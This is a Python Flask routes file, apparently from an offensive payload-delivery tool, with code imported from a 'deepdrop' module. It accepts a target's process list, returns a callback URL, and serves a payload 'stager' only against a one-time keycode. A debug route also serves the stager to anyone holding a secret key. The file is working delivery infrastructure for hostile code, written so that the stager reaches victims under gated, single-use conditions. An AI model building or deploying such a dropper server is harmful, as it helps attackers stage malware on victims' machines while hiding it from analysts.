from flask import request
from flask import redirect
from flask import url_for
from flask import Response
from flask import abort
from functools import wraps
from core.deepdrop import process_callback, create_payload, keycodes
from core import logging

def setup_routes(app):
    @app.route('/', methods=['GET'])
    def index():

        return 'Index'

    @app.route('/order', methods=['GET', 'POST'])
    def order():
        # Parse the full process list
        if request.method == 'POST':
            process_list = request.form['product']
            url = process_callback(process_list)
            
            return url

        # Inputs were collected client side via get
        if request.method == 'GET':
            
            return 'Hello'
    
    @app.route('/deliver/<keycode>', methods=['GET'])
    def deliver(keycode):

        if keycode not in keycodes['keycode']:
            logging.print('[!] Not a valid code')
            
            return redirect(url_for('index'))
        
        else:
            stager = create_payload()
            keycodes['used_codes'].append(keycode)
            keycodes['keycode'].clear()
            
            return Response(stager, mimetype='text/plain')

    if app.debug:
        @app.route('/<captains_key>', methods=['GET'])
        def debug(captains_key):

            if captains_key != app.config['CAPTAINS_KEY']:
                return '404'

            else:
                stager = create_payload()
                return Response(stager, mimetype='text/plain')